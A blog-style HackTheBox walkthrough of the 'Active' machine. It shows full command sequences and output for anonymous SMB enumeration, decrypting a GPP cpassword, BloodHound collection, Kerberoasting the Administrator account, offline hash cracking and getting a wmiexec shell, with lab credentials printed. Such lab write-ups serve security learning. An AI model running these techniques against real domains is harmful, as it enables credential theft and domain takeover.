---
categories:
- Hackthebox
image:
  path: active2.png
layout: post
media_subpath: /assets/images/active
tags:
- active directory
- Kerberoasting
- group-policy-preferences
- gpp
- bloodhound
- hackthebox
title: Active @ HackTheBox
---
## Introduction

Active is a Windows Server 2008 R2 domain controller that showcases common Active Directory security misconfigurations. The machine demonstrates the dangers of exposed Group Policy Preferences files containing encrypted credentials and the risks of Kerberoastable service accounts with weak passwords. The attack path leads from anonymous SMB access to full domain compromise through a combination of GPP decryption and Kerberoasting attacks
## Recon
### Port Scan
We run `nmap` to scan the target and find open ports
```
# Nmap 7.95 scan initiated Thu Jun 19 05:49:54 2025 as: /usr/lib/nmap/nmap --privileged -p53,88,135,139,389,445,464,593,636,3268,3269,49152,49153,49154,49155,49157,49158,49165 -sC -sV -oA nmap/active 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-19 09:50:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-19T09:51:10
|_  start_date: 2025-06-19T09:42:41
|_clock-skew: 7s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jun 19 05:51:52 2025 -- 1 IP address (1 host up) scanned in 118.24 seconds

```
We add the discovered domain to our hosts file.
```
echo "10.10.11.100     active.htb" | tee -a /etc/hosts
```

### SMB Enumeration
From the `nmap` results port 445 is open so we use `netexec` to enumerate file shares with anonymous authentication
```
nxc smb 10.10.10.100 -u '' -p '' --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                           
```
Using `smbclient` we connect to the share and recusively download all the files 
```
smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.3 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.9 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> 
```
Looking at the downloaded files I find a `Group.xml` file that is interesting
```
cd active.htb
find . -type f       
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
./Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
```
The `Groups.xml` file reads as follows
```
cat ./Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
We obtain a user of `SVC_TGS` and an encrypted password from the `Group.xml` file
```
name="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

## Initial Foothold
### Vulnerability Discovery

GPP is an extension of Group Policy that lets administrators **configure** settings more flexibly than traditional Group Policy Objects (GPOs). Introduced with Windows Server 2008, it gives admins the ability to **deploy settings** like:
- Mapped drives
- Registry settings 
- Scheduled tasks
- Shortcuts
- Environment variables
- Local users/groups
- INI files
Unlike regular GPOs that _enforce_ settings, GPP settings can be _optional_ and allow users to change them after they're applied.
Here's where GPP goes from useful to potentially exploit heaven:
#### 🧨 1. GPP Password Vulnerability (MS14-025)
Before the 2014 patch (MS14-025), you could create local admin accounts or map drives with embedded passwords in the GPP XML files. These passwords were encrypted using AES-256 but Microsoft hardcoded the key.
**Translation?**  
Anyone with read access to SYSVOL (basically any domain user) could grab the XML and decrypt the password using public tools like:
- `gpp-decrypt` (Metasploit module / standalone script) 
- `PowerSploit`'s `Get-GPPPassword`
- `Impacket`’s `secretsdump`

### Exploitation

We extract the password from `Group.xml` and decrypt it with `gpp-decrypt`
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
The account `SVC_TGS` has the password `GPPstillStandingStrong2k18`

## Post-Enumeration
### Enumeration
Now with valid credentials I have access to more shares including `Users` which isn't a default share 
```
nxc smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            
```
Using `smbclient` we can be able to connect to the share and retrieve the user flag from `SVC_TGS` Desktop folder
```
smbclient -U "SVC_TGS%GPPstillStandingStrong2k18" //10.10.10.100/Users                     
Try "help" to get a list of possible commands.
smb: \> cd SVC_TGS
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Thu Jun 19 05:43:51 2025

                5217023 blocks of size 4096. 278105 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 
```
## PRIVILEGE ESCALATION
### Vector Identification
Using the `SVC_TGT` credentials I dump bloodhound data
```
bloodhound-python -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -c All --zip -ns 10.10.10.100
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.active.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 59S
INFO: Compressing output into 20250619121949_bloodhound.zip
```
Then I start bloodhound to analyze the data
```
sudo bloodhound
<snip>
```
Looking at the `kerbroastable` accounts I find that `Administrator` is indeed `kerbroastable`
![image](Pasted image 20250619192646.png)
### 🔥 Kerberoasting
Kerberoasting  is a technique where an attacker:
1. Requests service tickets (TGS) for accounts with Service Principal Names (SPNs).
2. Extracts the encrypted part of those tickets (which are encrypted with the service account's NTLM hash).
3. Brute-forces them offline to recover the password.

> 🧠 **Key Point:** The service ticket is encrypted with the **service account’s NTLM hash**, which means if the password is weak, you can crack it.

Using `impacket-GetUserSpn` I request for Administrator's `TGS`
```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-06-19 05:43:53.597767             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$8a5a3abf4e2733ab1d9d661084196b5e$94d40272f263f3f120b0411eb4670adc681f62e8277aa06245d43b8eb4dd05502824cdb72ceb7e42de5e386af0f3c230331c58ff7fb526fd8d232d719d2ba43829949625f5c38a2a774a41940a170b9931360a7a7fc91cc45616189dc142241a92f8a9c2f505b9b91d7fc1e590a88d0fa4a7fbbad52998c13c8ce5842b21fb44305a3187a37d3fc979372dbdcbedb89c0839ea1cb185d2bc20a66ed07f780e06c90322c7c740888f34dd77f7af482ecd1e178b959a037aa0bc374b6f5df746fe32486b547b6b56ca88f00ce6c87ee81f8854e5e92c413361147096673856164c24902ea41db0fd7797f7c2b650994abec0e32269397782ad8bdd0665538584814df6f37cf8866f46cb38f5e762162828fc76c817c2859f50920a48733a1964f839d2f42c01c46efab69fc36fbb3824f82010d9c2c90b38f8a84a2d8a78ce6cafdaf7ded905170c0b840474bd19db73101390646b2cf492d6148b65b0e033a10f0dc1e51774c832d58f5909d1022237cf7b8395ac4630cd2b12b66c4415653be9cf2949a586ba8fff6aec57abe2ef1066c43a585742f7dc03c4447e213968e3799d83db088d331b1d886ed28144240cb4d7eaf542ea7219d37df7867765db3acf7f349419ac45c99627d6d56c66c8f0e7e5ac1622727457340ccdfd0865cd291c01baac70ef0860b776c6a8fab2ea43c3b11bf2cc48001f5a84feb47963dbaa40474a7b419467e4728ba8730951703fd85c61503ada701b05433e7e7dafdf4499a948e8e02165b467dc60bb8f0a1d8ac6efc9379eae2ffab1cccd225475ab7584a8661e961f1e7a8ca1cf0ea74f165c9f0f2c1233a8410dc06f62157930b9b6e85d4c258a6e3fb029e490d921b3b35cf2bb1a3eedbc8a9103a266934a2e0d75d4363e368ce0a089d1b9c02d046fbad707b77b59f4e9a0de2c9820df7dd712cec9f37a040a7e2b293bbd156563b086e050bd1bdd57eff16c6576f5b6f7d836df238c65c2a35bc7c9b7ba7c74c2c20391b36cb65f31fea4387e880b7e1b240291db92dd81f6784ad0aa301c77dbc2d741c0c94c892d9c8bbc887edbfb56c4efeb4e836a9b508ff09595ab2ab0a36a4858c46cb434088d542cd29b06cabd8eb16d367523b7b2abb665c3b7eef8b4fd4dbda271851698b3b59c62a2a9278aa457c1dd70ef89d7baee7645cbe750c46f3b329d22dcb9599929c3178ba87feac94faaafe61aa734597549897c8148aca991c8f699e6e8a4d8bf757acbfb

```

## CRACKING THE HASH OFFLINE
Using `hashcat` I crack the hash 
```
hashcat hash /usr/share/wordlists/rockyou.txt
<snip>
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7fcc7379128b25853fa5123de476095c$85c5d2c9538bfda76a2f8f0dee3a5c1d6048c758008dda921743b4dee0f53a46443edd260ec2d4225d332e0075e6adf780eba777e9fd521405134b4e09aa263f27ee70753fe4441a67ac08177b663075806221a79f823a03da67d595b4edf0012cdd84b1c3192ce9d27c2b8b5bec3825d650bf68809895b5b054de74841c43cd5d1ec2dc8a7e548f5870753d63938d59e05f448307e40662677baec6c4fd54e4b898440ccba999bc673037a0177f800985dc42d8c898dba8b2aaf313558898f759cddfd5677406a01fa8ae06d5d1c4464af54472097210d1867415c98ddd816165adc4c3ded39228ed83a7634d8f1e81c44cef1cc06b46a1bf70385430fb786c400509daeda001093e7a477762f017fc1b73a5ebd6ac6458334bb7a5aeeaf7b63a93eb671da102249223984cdcedb176952b4a6ed3a05b803cc41c914e31a825e1628e804fd4d33d3a21b95f8a8eb35a15bec1f183df6f46508eabbf3a2a67af00341cc9988f5d9ed883f9c38626cc8e96753e81d314952dfdf39342e9107244a8ba8109d9de596cf6295ba3d235c2b6402cb70f1394f74396d03b024d3919a112b857f44398114e3afca72ab6bc2febd19f7a98dbae6d711870b8bbe510ceeb9c366a045653eca5cd08e88379ba1f3a57a071c04ccbc3bb6841d5d2c82bf7c573915485bb0f8eb9b64f15212aad3139cb3fc8ea5018e34d5039c5a4545ffa164d044f47cd07335ffe7b1ee43c56c9343b2363a5d82e58a1c33163805c8dadb1cd87c1de6d6d89f7ca9c843b706804df9a148ba511e3fc1351db6f316cd85e59cb311d591d1cfdbd192e70031963b3f1857e3ddd4984448f98284f7d34a5af65b04647b7d57b1a8dc0324d89b46fd1a80552e2b00c760adfa74229b0d404eb0712710a62417bd7448df380bd3b3f25f928c0d50b1ae04df3fe17dd0bb9b9c9a673a0fc267f8542a24aa66d9e75582deeab59b773ef2412512cac34556c32ba755e2cb2093d7a8f73b2def4cb28d4eacaa275da5386ab44d88b2df2bdd078c0b950cd82396b79a5773dd93870e7e6c3045e382729770b48b10dd434f3c9586da36b5c3eef9050806eb012770bf8f562fe01e0c22c0a50e61fe8e6250c73892141b707ad59f00a448912637b716590d334346f6a0dde5ddfa6894620b57f9615739758a5ad8df56ee2d787b03d8433588f9d133220475a4014940475ce5deeaf58458188b0f748a4c5b08bc083f264f0610d2d27536e6affd2b073:Ticketmaster1968
<snip>
```
Then one can use either `impacket-psexec and impacket-winiexec` to get a shell or `smbclient` to get the root flag in `Administrator's` Desktop
```
impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 -dc-ip 10.10.10.100 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands


smbclient -U "Administrator%Ticketmaster1968" //10.10.10.100/Users
Try "help" to get a list of possible commands.
smb: \> cd Administrator/Desktop
smb: \Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Thu Jun 19 05:43:51 2025

                5217023 blocks of size 4096. 278075 blocks available
smb: \Administrator\Desktop\> 
```
